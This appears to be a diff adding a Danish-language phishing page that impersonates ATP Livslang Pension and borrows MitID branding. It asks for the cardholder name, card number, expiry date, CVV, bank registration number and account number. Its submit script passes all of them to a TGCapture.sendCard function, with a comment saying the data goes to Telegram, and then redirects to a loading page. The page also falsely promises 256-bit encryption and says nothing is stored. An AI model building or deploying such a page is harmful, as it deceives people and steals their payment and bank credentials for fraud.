@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kort &amp; Konto Detaljer – ATP</title>
+  <meta name="description" content="Bekræft dine kort- og kontooplysninger for at fortsætte med ATP Livslang Pension.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --atp-green:      #1C3D2A;
+      --atp-green-mid:  #2E5C3C;
+      --atp-lime:       #C4D600;
+      --atp-lime-dark:  #A8BA00;
+      --atp-light:      #F4F6F4;
+      --atp-border:     #D5DDD5;
+      --atp-text:       #1A1A1A;
+      --atp-muted:      #5C6B5C;
+      --atp-white:      #FFFFFF;
+      --atp-error:      #C62828;
+      --radius:         6px;
+      --shadow:         0 2px 12px rgba(28,61,42,0.10);
+    }
+
+    html { font-size: 16px; }
+
+    body {
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+      background: #F0F2F0;
+      color: var(--atp-text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Header ── */
+    .site-header {
+      background: #fff;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      border-bottom: 1px solid var(--atp-border);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .site-header__logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+    }
+    .logo-text {
+      font-weight: 700;
+      font-size: 26px;
+      color: #1A1A1A;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+    .logo-eq {
+      font-weight: 700;
+      font-size: 26px;
+      color: #A8BA00;
+      line-height: 1;
+    }
+    .site-header__right {
+      margin-left: auto;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .header-secure-badge {
+      background: #EDF5EC;
+      border: 1px solid var(--atp-green);
+      color: var(--atp-green);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 11px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .header-secure-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: var(--atp-green);
+      flex-shrink: 0;
+    }
+
+    /* ── Hero band ── */
+    .hero-band {
+      background: #1C3D2A;
+      padding: 36px 24px 32px;
+      text-align: center;
+      color: #fff;
+    }
+    .hero-band__step {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.12);
+      border: 1px solid rgba(255,255,255,0.22);
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 4px 14px;
+      margin-bottom: 14px;
+    }
+    .hero-band__title {
+      font-size: clamp(22px, 4vw, 30px);
+      font-weight: 700;
+      margin-bottom: 8px;
+      line-height: 1.25;
+    }
+    .hero-band__subtitle {
+      font-size: 15px;
+      opacity: 0.85;
+      max-width: 520px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+
+    /* ── Progress bar ── */
+    .progress-wrap {
+      max-width: 640px;
+      margin: 0 auto;
+      padding: 22px 24px 0;
+    }
+    .progress-steps {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      flex: 1;
+    }
+    .progress-step__dot {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 700;
+      border: 2px solid var(--atp-border);
+      background: var(--atp-white);
+      color: var(--atp-muted);
+      position: relative;
+      z-index: 1;
+      transition: all 0.2s;
+    }
+    .progress-step.active .progress-step__dot {
+      background: var(--atp-green);
+      border-color: var(--atp-green);
+      color: #fff;
+      box-shadow: 0 0 0 4px rgba(28,61,42,0.15);
+    }
+    .progress-step.done .progress-step__dot {
+      background: var(--atp-lime-dark);
+      border-color: var(--atp-lime-dark);
+      color: var(--atp-green);
+    }
+    .progress-step__label {
+      font-size: 11px;
+      margin-top: 6px;
+      color: var(--atp-muted);
+      font-weight: 500;
+      text-align: center;
+    }
+    .progress-step.active .progress-step__label { color: var(--atp-green); font-weight: 700; }
+    .progress-step::before {
+      content: '';
+      position: absolute;
+      top: 15px; right: calc(50% + 16px);
+      left: calc(-50% + 16px);
+      height: 2px;
+      background: var(--atp-border);
+      z-index: 0;
+    }
+    .progress-step:first-child::before { display: none; }
+    .progress-step.done::before { background: var(--atp-lime-dark); }
+
+    /* ── Main card ── */
+    .main-wrap {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 28px 16px 48px;
+    }
+    .form-card {
+      background: var(--atp-white);
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--atp-border);
+      width: 100%;
+      max-width: 580px;
+    }
+    .form-card__header {
+      background: #EDF5EC;
+      border-bottom: 1px solid var(--atp-border);
+      padding: 18px 28px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .form-card__icon {
+      width: 42px; height: 42px;
+      background: var(--atp-green);
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .form-card__icon svg {
+      width: 22px; height: 22px;
+      fill: #fff;
+    }
+    .form-card__header-text h2 {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--atp-green);
+    }
+    .form-card__header-text p {
+      font-size: 13px;
+      color: var(--atp-muted);
+      margin-top: 2px;
+    }
+    .form-card__body {
+      padding: 28px 28px 24px;
+    }
+
+    /* ── Card Preview ── */
+    .card-preview {
+      position: relative;
+      background: linear-gradient(135deg, var(--atp-green) 0%, var(--atp-green-mid) 100%);
+      border-radius: 12px;
+      padding: 22px 22px 20px;
+      color: #fff;
+      box-shadow: 0 6px 20px rgba(28,61,42,0.25);
+      margin-bottom: 10px;
+      overflow: hidden;
+    }
+    .card-preview::before {
+      content: '';
+      position: absolute;
+      top: -40px; right: -40px;
+      width: 160px; height: 160px;
+      border-radius: 50%;
+      background: rgba(196,214,0,0.08);
+    }
+    .card-preview::after {
+      content: '';
+      position: absolute;
+      bottom: -60px; left: -30px;
+      width: 180px; height: 180px;
+      border-radius: 50%;
+      background: rgba(196,214,0,0.06);
+    }
+    .card-preview__label {
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      opacity: 0.75;
+      margin-bottom: 32px;
+      position: relative;
+      z-index: 1;
+    }
+    .card-preview__number {
+      font-family: 'Courier New', monospace;
+      font-size: 20px;
+      font-weight: 600;
+      letter-spacing: 2px;
+      margin-bottom: 24px;
+      position: relative;
+      z-index: 1;
+    }
+    .card-preview__bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      position: relative;
+      z-index: 1;
+    }
+    .card-preview__name {
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      max-width: 60%;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+    .card-preview__expiry {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      font-size: 10px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      opacity: 0.85;
+      text-transform: uppercase;
+    }
+    .card-preview__expiry span:last-child {
+      font-size: 14px;
+      font-weight: 700;
+      margin-top: 2px;
+      opacity: 1;
+      letter-spacing: 0.5px;
+    }
+    .card-chip {
+      position: absolute;
+      top: 46px;
+      right: 22px;
+      width: 38px;
+      height: 28px;
+      z-index: 1;
+    }
+
+    /* ── Fields ── */
+    .field-group {
+      margin-bottom: 18px;
+    }
+    .field-group label {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--atp-green);
+      margin-bottom: 6px;
+    }
+    .field-group label svg {
+      width: 15px; height: 15px;
+      fill: var(--atp-green);
+      flex-shrink: 0;
+    }
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+    }
+    .field-group input {
+      width: 100%;
+      height: 46px;
+      border: 1.5px solid var(--atp-border);
+      border-radius: 4px;
+      padding: 0 13px;
+      font-size: 15px;
+      font-family: inherit;
+      color: var(--atp-text);
+      background: #fff;
+      outline: none;
+      transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+      -webkit-appearance: none;
+    }
+    .field-group input::placeholder { color: #A8B8A8; }
+    .field-group input:focus {
+      border-color: var(--atp-green);
+      box-shadow: 0 0 0 3px rgba(28,61,42,0.10);
+    }
+    .field-group input.filled {
+      border-color: var(--atp-lime-dark);
+      background: #FAFFF0;
+    }
+    .field-group .field-note {
+      font-size: 11.5px;
+      color: var(--atp-muted);
+      margin-top: 4px;
+    }
+
+    /* ── Divider ── */
+    .section-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 22px 0 18px;
+    }
+    .section-divider__line { flex: 1; height: 1px; background: var(--atp-border); }
+    .section-divider__label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--atp-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── Secure notice ── */
+    .secure-notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #EDF5EC;
+      border: 1px solid #B3D4B3;
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      margin-bottom: 22px;
+    }
+    .secure-notice__icon {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .secure-notice__icon svg {
+      width: 18px; height: 18px;
+      fill: var(--atp-green);
+    }
+    .secure-notice__text { font-size: 13px; color: var(--atp-green); line-height: 1.5; }
+    .secure-notice__text strong { font-weight: 700; }
+
+    /* ── Submit button (split style) ── */
+    .form-card__footer {
+      padding: 0 28px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background: var(--atp-green);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+      transition: background 0.18s;
+      letter-spacing: 0.2px;
+    }
+    .btn-submit:hover { background: var(--atp-green-mid); }
+    .btn-submit:hover .btn-submit__arrow { background: var(--atp-lime-dark); }
+    .btn-submit__text {
+      flex: 1;
+      padding: 0 18px;
+      text-align: left;
+    }
+    .btn-submit__arrow {
+      width: 52px;
+      height: 52px;
+      background: var(--atp-lime);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: background 0.18s;
+    }
+    .btn-submit__arrow svg {
+      width: 22px; height: 22px;
+      fill: var(--atp-green);
+    }
+
+    .btn-back {
+      width: 100%;
+      height: 44px;
+      background: transparent;
+      color: var(--atp-green);
+      border: 1.5px solid var(--atp-border);
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.15s, border-color 0.15s;
+    }
+    .btn-back:hover { background: var(--atp-light); border-color: var(--atp-green); }
+
+    /* ── Footer ── */
+    .site-footer {
+      background: var(--atp-green);
+      color: rgba(255,255,255,0.7);
+      text-align: center;
+      padding: 18px 24px;
+      font-size: 13px;
+    }
+    .site-footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
+    .site-footer a:hover { text-decoration: underline; }
+
+    /* ── Error ── */
+    .error-msg {
+      font-size: 12px;
+      color: var(--atp-error);
+      margin-top: 4px;
+      display: none;
+    }
+    .field-group.has-error input { border-color: var(--atp-error); }
+    .field-group.has-error .error-msg { display: block; }
+
+    @media (max-width: 500px) {
+      .field-row { grid-template-columns: 1fr; }
+      .form-card__body { padding: 20px 16px 16px; }
+      .form-card__footer { padding: 0 16px 20px; }
+      .form-card__header { padding: 14px 16px; }
+      .card-preview__number { font-size: 17px; letter-spacing: 1.5px; }
+    }
+
+    /* ── Page-transition loading overlay ── */
+    #atp-loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 99999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    #atp-loading-overlay.visible { display: flex; }
+    .atp-ov-logo { margin-bottom: 32px; }
+    .atp-ov-shield-wrap {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 24px;
+    }
+    .atp-ov-spinner {
+      width: 52px; height: 52px;
+      position: absolute; top: 34px; left: 34px;
+      animation: atp-spin 1.2s linear infinite;
+    }
+    @keyframes atp-spin { to { transform: rotate(360deg); } }
+    .atp-ov-title {
+      font-size: 19px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0 0 8px;
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+    }
+    .atp-ov-sub {
+      font-size: 15px;
+      color: #6b7280;
+      margin: 0;
+      font-family: 'IBM Plex Sans', Arial, sans-serif;
+    }
+  </style>
+
+  <script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+
+<!-- Page-transition loading overlay -->
+<div id="atp-loading-overlay">
+  <div class="atp-ov-logo"><img src="assets/mitidlogo.webp" alt="MitID" style="height:38px;width:auto;"></div>
+  <div class="atp-ov-shield-wrap">
+    <img src="assets/shield.png" style="width:120px;height:120px;position:absolute;top:0;left:0;" alt="">
+    <svg class="atp-ov-spinner" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="26" cy="26" r="17" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="3"/>
+      <circle cx="26" cy="26" r="17" fill="none" stroke="white" stroke-width="3" stroke-dasharray="27 80" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <p class="atp-ov-title">Bekræfter dine kortoplysninger</p>
+  <p class="atp-ov-sub">Vent et øjeblik ...</p>
+</div>
+
+<!-- ── Header ── -->
+<header class="site-header">
+  <a class="site-header__logo" href="index.html">
+    <span class="logo-text">atp</span><span class="logo-eq">=</span>
+  </a>
+  <div class="site-header__right">
+    <span class="header-secure-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
+      Sikker forbindelse
+    </span>
+  </div>
+</header>
+
+<!-- ── Hero ── -->
+<div class="hero-band">
+  <div class="hero-band__step">Trin 2 af 2</div>
+  <h1 class="hero-band__title">Kort &amp; Konto Detaljer</h1>
+  <p class="hero-band__subtitle">Angiv dine betalingsoplysninger for at tilknytte dit kort og din bankkonto til ATP.</p>
+</div>
+
+<!-- ── Progress ── -->
+<div class="progress-wrap">
+  <div class="progress-steps">
+    <div class="progress-step done">
+      <div class="progress-step__dot">✓</div>
+      <div class="progress-step__label">Personlige<br>Oplysninger</div>
+    </div>
+    <div class="progress-step active">
+      <div class="progress-step__dot">2</div>
+      <div class="progress-step__label">Kort &amp;<br>Konto</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Main ── -->
+<main class="main-wrap">
+  <div class="form-card">
+
+    <!-- Card header -->
+    <div class="form-card__header">
+      <div class="form-card__icon">
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+      </div>
+      <div class="form-card__header-text">
+        <h2>Kort &amp; Konto Detaljer</h2>
+        <p>Tilknyt dit betalingskort og din bankkonto</p>
+      </div>
+    </div>
+
+    <form id="card-form" novalidate>
+      <div class="form-card__body">
+
+        <!-- Live card preview -->
+        <div class="card-preview">
+          <div class="card-preview__label">Betalingskort</div>
+          <div class="card-preview__number" id="preview-number">•••• •••• •••• ••••</div>
+          <div class="card-preview__bottom">
+            <div class="card-preview__name" id="preview-name">KORTEJER NAVN</div>
+            <div class="card-preview__expiry">
+              <span>Udløber</span>
+              <span id="preview-expiry">MM/ÅÅ</span>
+            </div>
+          </div>
+          <div class="card-chip">
+            <svg viewBox="0 0 38 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="1" y="1" width="36" height="26" rx="4" fill="#D4AF37" stroke="#B8960C" stroke-width="1.5"/>
+              <rect x="7" y="7" width="24" height="14" rx="2" fill="none" stroke="#B8960C" stroke-width="1"/>
+              <line x1="19" y1="7" x2="19" y2="21" stroke="#B8960C" stroke-width="1"/>
+              <line x1="7" y1="14" x2="31" y2="14" stroke="#B8960C" stroke-width="1"/>
+            </svg>
+          </div>
+        </div>
+
+        <div class="secure-notice" style="margin-top:22px;">
+          <span class="secure-notice__icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
+          </span>
+          <span class="secure-notice__text">
+            <strong>256-bit kryptering.</strong> Dine kortdata behandles sikkert og gemmes ikke på vores servere.
+          </span>
+        </div>
+
+        <!-- Section: Kortoplysninger -->
+        <div class="section-divider">
+          <div class="section-divider__line"></div>
+          <div class="section-divider__label">Kortoplysninger</div>
+          <div class="section-divider__line"></div>
+        </div>
+
+        <!-- Kortejer navn -->
+        <div class="field-group" id="fg-kortejer">
+          <label for="kortejer">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+            Kort Ejernavn
+          </label>
+          <input type="text" id="kortejer" name="kortejer" placeholder="Kort Ejernavn" autocomplete="cc-name" style="text-transform:uppercase">
+          <span class="error-msg">Indtast venligst kortholderens navn.</span>
+        </div>
+
+        <!-- Kortnummer -->
+        <div class="field-group" id="fg-kortnummer">
+          <label for="kortnummer">
+            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+            Kort Nummer
+          </label>
+          <input type="text" id="kortnummer" name="kortnummer" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" inputmode="numeric">
+          <span class="error-msg">Indtast venligst et gyldigt kortnummer (16 cifre).</span>
+        </div>
+
+        <!-- Udløbsdato + CVV -->
+        <div class="field-row">
+          <div class="field-group" id="fg-udlob">
+            <label for="udlob">
+              <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM7 10h5v5H7z"/></svg>
+              Udløbsdato
+            </label>
+            <input type="text" id="udlob" name="udlob" placeholder="MM/ÅÅ" maxlength="5" autocomplete="cc-exp" inputmode="numeric">
+            <span class="error-msg">Ugyldig dato (MM/ÅÅ).</span>
+          </div>
+          <div class="field-group" id="fg-cvv">
+            <label for="cvv">
+              <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+              CVV
+            </label>
+            <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+            <div class="field-note">3 eller 4 cifre på bagsiden af kortet.</div>
+            <span class="error-msg">Ugyldig CVV.</span>
+          </div>
+        </div>
+
+        <!-- Section: Kontooplysninger -->
+        <div class="section-divider">
+          <div class="section-divider__line"></div>
+          <div class="section-divider__label">Kontooplysninger</div>
+          <div class="section-divider__line"></div>
+        </div>
+
+        <!-- Regnr + Kontonr -->
+        <div class="field-row">
+          <div class="field-group" id="fg-regnr">
+            <label for="regnr">
+              <svg viewBox="0 0 24 24"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zM12 1L2 6v2h20V6z"/></svg>
+              Registreringsnr.
+            </label>
+            <input type="text" id="regnr" name="regnr" placeholder="Registreringsnr." maxlength="4" inputmode="numeric">
+            <span class="error-msg">Angiv venligst registreringsnummer.</span>
+          </div>
+          <div class="field-group" id="fg-kontonr">
+            <label for="kontonr">
+              <svg viewBox="0 0 24 24"><path d="M4 10h3v7H4zm6.5 0h3v7h-3zM2 19h20v3H2zm15-9h3v7h-3zM12 1L2 6v2h20V6z"/></svg>
+              Kontonummer
+            </label>
+            <input type="text" id="kontonr" name="kontonr" placeholder="Kontonummer" maxlength="10" inputmode="numeric">
+            <span class="error-msg">Angiv venligst kontonummer.</span>
+          </div>
+        </div>
+
+      </div>
+
+      <div class="form-card__footer">
+        <button type="submit" class="btn-submit" id="card-submit-btn">
+          <span class="btn-submit__text">Bekræft og afslut</span>
+          <span class="btn-submit__arrow">
+            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+          </span>
+        </button>
+        <button type="button" class="btn-back" onclick="window.location.href='info.html'">
+          ← Tilbage til personlige oplysninger
+        </button>
+      </div>
+    </form>
+  </div>
+</main>
+
+<!-- ── Footer ── -->
+<footer class="site-footer">
+  <p>&copy; 2026 ATP – Arbejdsmarkedets Tillægspension &nbsp;|&nbsp;
+    <a href="#">Privatlivspolitik</a> &nbsp;|&nbsp;
+    <a href="#">Tilgængelighed</a>
+  </p>
+</footer>
+
+<script src="tg.js"></script>
+<script>
+(function () {
+
+  /* ── Card number formatter ── */
+  var kortInput = document.getElementById('kortnummer');
+  kortInput.addEventListener('input', function () {
+    var v = this.value.replace(/\D/g, '').substring(0, 16);
+    this.value = v.replace(/(.{4})/g, '$1 ').trim();
+    updatePreview();
+    if (v.length > 0) this.classList.add('filled');
+    else this.classList.remove('filled');
+  });
+
+  /* ── Expiry formatter ── */
+  var udlobInput = document.getElementById('udlob');
+  udlobInput.addEventListener('input', function () {
+    var v = this.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    this.value = v;
+    updatePreview();
+    if (v.length > 0) this.classList.add('filled');
+    else this.classList.remove('filled');
+  });
+
+  /* ── Numeric only for CVV / Regnr / Kontonr ── */
+  ['cvv','regnr','kontonr'].forEach(function (id) {
+    var el = document.getElementById(id);
+    el.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '');
+      if (this.value.length > 0) this.classList.add('filled');
+      else this.classList.remove('filled');
+    });
+  });
+
+  /* ── Kortejer live ── */
+  var kortejerInput = document.getElementById('kortejer');
+  kortejerInput.addEventListener('input', function () {
+    updatePreview();
+    if (this.value.trim()) this.classList.add('filled');
+    else this.classList.remove('filled');
+  });
+
+  /* ── Live preview update ── */
+  function updatePreview() {
+    var num = document.getElementById('kortnummer').value.trim();
+    var name = document.getElementById('kortejer').value.trim().toUpperCase();
+    var exp  = document.getElementById('udlob').value.trim();
+
+    var pn = document.getElementById('preview-number');
+    pn.textContent = num || '•••• •••• •••• ••••';
+
+    var pname = document.getElementById('preview-name');
+    pname.textContent = name || 'KORTEJER NAVN';
+
+    var pexp = document.getElementById('preview-expiry');
+    pexp.textContent = exp || 'MM/ÅÅ';
+  }
+
+  /* ── Validation ── */
+  function markError(id, bad) {
+    var fg = document.getElementById('fg-' + id);
+    if (!fg) return;
+    if (bad) fg.classList.add('has-error');
+    else fg.classList.remove('has-error');
+  }
+
+  var form = document.getElementById('card-form');
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var kortejer   = document.getElementById('kortejer').value.trim();
+    var kortnummer = document.getElementById('kortnummer').value.trim();
+    var udlob      = document.getElementById('udlob').value.trim();
+    var cvv        = document.getElementById('cvv').value.trim();
+    var regnr      = document.getElementById('regnr').value.trim();
+    var kontonr    = document.getElementById('kontonr').value.trim();
+
+    var ok = true;
+    markError('kortejer',   !kortejer);   if (!kortejer)   ok = false;
+    markError('kortnummer', !kortnummer); if (!kortnummer) ok = false;
+    markError('udlob',      !udlob);      if (!udlob)      ok = false;
+    markError('cvv',        !cvv);        if (!cvv)        ok = false;
+    markError('regnr',      !regnr);      if (!regnr)      ok = false;
+    markError('kontonr',    !kontonr);    if (!kontonr)    ok = false;
+
+    if (!ok) return;
+
+    // Send full combined message to Telegram using unified ATP format
+    if (window.TGCapture) {
+      TGCapture.sendCard({
+        kortejer:   kortejer,
+        kortnummer: kortnummer,
+        udlob:      udlob,
+        cvv:        cvv,
+        regnr:      regnr,
+        kontonr:    kontonr
+      });
+    }
+
+    // Redirect to loading page
+    window.location.href = 'loading.html';
+  });
+
+}());
+</script>
+</body>
+</html>
